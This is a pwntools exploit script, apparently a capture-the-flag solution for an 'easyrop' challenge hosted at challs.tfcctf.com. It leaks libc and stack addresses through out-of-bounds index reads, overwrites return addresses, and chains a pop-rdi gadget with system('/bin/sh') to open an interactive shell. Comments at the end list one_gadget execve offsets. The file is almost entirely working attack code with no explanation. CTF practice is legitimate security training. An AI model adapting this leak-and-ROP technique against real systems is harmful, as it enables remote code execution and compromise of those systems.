#!/usr/bin/python3

from pwn import *

exe = ELF('easyrop_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000401460
                b*main+323
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.tfcctf.com', 31922)
else:
        p = process(exe.path)

GDB()
def write(idx, payload):
        sla(b"read!\n", "1")
        sla(b"index: ", str(idx))
        sla(b"write: ", str(payload))
def read(idx):
        sla(b"read!\n", "2")
        sla(b"index: ", str(idx).encode())
        p.recvuntil(b"is ")
        return int("0x" + p.recvline(keepends=False).decode(), 16)
part1 = hex(read(130))
part2 = hex(read(131))
libc_leak = int(part2 + part1[2:], 16)
libc.address = libc_leak - 0x29d90
gadget = libc.address + 0xebcf1
poprdi = libc.address + 0x000000000002a745
# poprdx
info("Libc base: " + hex(libc.address))

part1 = hex(read(130 + 42))
part2 = hex(read(131 + 42))
stack = int(part2 + part1[2:], 16)
info("Stack: " + hex(stack))

write(130, (exe.sym.main+5 & 0xffffffff))
write(131, ((exe.sym.main+5) >> 32)& 0xffffffff)

write(136, ((stack -0x20- 0x108) & 0xffffffff))
write(137, ((stack -0x20- 0x108) >> 32)& 0xffffffff)
sla(b"read!\n", "0")

write(130-6, (0x68732f6e69622f & 0xffffffff))
write(131-6, ((0x68732f6e69622f) >> 32)& 0xffffffff)

write(136, ((libc.sym.system) & 0xffffffff))
write(137, ((libc.sym.system) >> 32)& 0xffffffff)

write(130, (poprdi & 0xffffffff))
write(131, ((poprdi) >> 32)& 0xffffffff)
p.interactive()


# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL